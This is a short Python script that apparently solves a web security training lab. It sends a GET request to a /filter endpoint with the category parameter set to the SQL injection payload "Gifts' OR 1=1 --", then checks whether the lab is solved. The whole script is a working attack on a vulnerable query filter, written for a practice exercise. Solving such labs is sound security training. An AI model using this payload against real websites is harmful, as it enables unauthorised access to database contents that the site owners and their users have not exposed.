from base.base import Base

class SQL(Base):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
    def _add_args(self):
        pass

    def run(self):
        self.params = {'category': "Gifts' OR 1=1 --"}
        response = self.session.get(f"{self.base_url}/filter", params=self.params)
        
        self.is_lab_solved()


if __name__ == "__main__":
    sql = SQL()
    sql.run()